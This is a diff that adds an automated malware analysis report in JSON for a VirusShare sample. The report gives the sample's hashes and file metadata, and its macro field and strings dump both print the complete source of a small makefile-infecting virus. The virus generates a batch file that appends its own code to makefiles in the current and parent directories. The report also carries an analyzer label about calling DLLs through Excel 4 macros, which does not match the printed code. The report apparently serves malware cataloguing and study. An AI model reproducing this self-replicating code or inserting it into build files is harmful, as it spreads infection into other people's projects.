@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CALL": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "OurHost :\n @IF EXIST MAKEFILE FIND \"GW\"<MAKEFILE >GW.TMP\n @ECHO @CTTY NUL >GW.BAT\n @ECHO IF _%1==_GW GOTO GW_INF >>GW.BAT\n @ECHO IF EXIST ..\\MAKEFILE CALL GW.BAT GW ..\\MAKEFILE >>GW.BAT\n @ECHO GOTO GW_END >>GW.BAT\n @ECHO :GW_INF >>GW.BAT\n @ECHO FIND \"GW\" %2 >>GW.BAT\n @ECHO IF NOT ERRORLEVEL 1 GOTO GW_END >>GW.BAT\n @ECHO COPY /B %2+GW.TMP %2 >>GW.BAT\n @ECHO :GW_END >>GW.BAT\n @call GW.BAT\n @del GW.BAT\n @del GW.TMP\n# [MakeGWAR] by Gobleen Warrior//SMF"
+    },
+    "filename": "VirusShare_21a4de894b8838ad660e9cff3c16b659",
+    "filesize": 468,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "21a4de894b8838ad660e9cff3c16b659",
+        "sha1": "84ed9c4fa8b626cebbf34c54635bb4cb0ea60ae5",
+        "sha256": "a40b9786e98d9e18af887e01554df6e4d14c9787dfcf4df394eb5da6a6d1e506"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "OurHost :",
+            " @IF EXIST MAKEFILE FIND \"GW\"<MAKEFILE >GW.TMP",
+            " @ECHO @CTTY NUL >GW.BAT",
+            " @ECHO IF _%1==_GW GOTO GW_INF >>GW.BAT",
+            " @ECHO IF EXIST ..\\MAKEFILE CALL GW.BAT GW ..\\MAKEFILE >>GW.BAT",
+            " @ECHO GOTO GW_END >>GW.BAT",
+            " @ECHO :GW_INF >>GW.BAT",
+            " @ECHO FIND \"GW\" %2 >>GW.BAT",
+            " @ECHO IF NOT ERRORLEVEL 1 GOTO GW_END >>GW.BAT",
+            " @ECHO COPY /B %2+GW.TMP %2 >>GW.BAT",
+            " @ECHO :GW_END >>GW.BAT",
+            " @call GW.BAT",
+            " @del GW.BAT",
+            " @del GW.TMP",
+            "# [MakeGWAR] by Gobleen Warrior//SMF"
+        ],
+        "file": {
+            " @IF EXIST MAKEFILE FIND \"GW\"<MAKEFILE >GW.TMP": "Temporary",
+            " @del GW.TMP": "Temporary"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.276613",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
